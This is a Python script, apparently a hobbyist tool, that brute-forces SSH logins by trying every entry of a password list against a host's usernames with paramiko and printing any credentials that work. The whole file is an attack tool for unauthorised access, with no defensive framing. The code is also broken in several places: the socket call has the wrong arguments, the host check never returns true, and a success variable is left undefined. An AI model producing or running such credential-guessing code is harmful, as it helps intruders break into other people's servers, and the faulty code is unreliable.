import os
import paramiko 
import argparse
import socket
import colorama
#init for colrama
colorama.init()

def isopen(ip,port):
#check if host is up with open port specified by user by defualt its 22(ssh)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,)
    s.settimeout(10)
    try:
        s.connect(ip,int(port))
    except:
        return False
    finally:
        s.shutdown()
def ssh_connection(host,port, username, password):
#connect to host with the username and password given by the bruteforce function
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port, username, password)
    except paramiko.AuthenticationException:
        code = 1
    finally:
        ssh.close()
        return code
def succes(username, password):
#print creds on succes
    message  = f"""
               **********
               username:{username}\npassword:{password}
               **********
               """
    print(colorama.Fore.RED, message)
def bruteforce(host, passwordlist, username, port):
    status = os.path.isfile(passwordlist)
    #check if paswordlist exists
    if status != False:
        #check if host is up
        host_up = isopen(host,port)
        if host_up:
            #check if username is a list or a single username
            check = os.path.isfile(username)
            if check:
                with open(username,'r') as users:
                    for  user in users:
                        with open(passwordlist,'r') as passwords:
                            for row in passwords:
                                code = ssh_connection(host, port, user, row)
                                if code == 0:
                                    succes(username, row)
                                    break
                            if code==0:
                                pass
                            else:
                                print(f"no valid password in passwordlist for username:{row}")
            else:
                with open(passwordlist,'r') as f:
                    for row in f:
                        code = ssh_connection(host, port, username, row)
                        if code == 0:
                            succes(username, row)
                            break
                        if code==0:
                                pass
                        else:
                                print(f"no valid password in passwordlist for username:{username}")
        else:
            failed = "host is down or port is closed"
            return failed
    else:
        failed = "password list is not a file"
        return failed

parser = argparse.ArgumentParser()

parser.add_argument("--host", type=str, help="Host to bruteforce")
parser.add_argument("--passwordlist", type=str, help="Path to paswordlist")
parser.add_argument("--useranme", type=str, help="username or path to username list")
parser.add_argument("--port", type=int, default=22, help="port on  remote machine. defualt is 22")


args = parser.parse_args()

def main(args):
   host = args.host
   passwordlist = args.passwordlist
   username = args.useranme
   port = args.port
   bruteforce(host, passwordlist, username, port)


if __name__ == "__main__":
    main(args)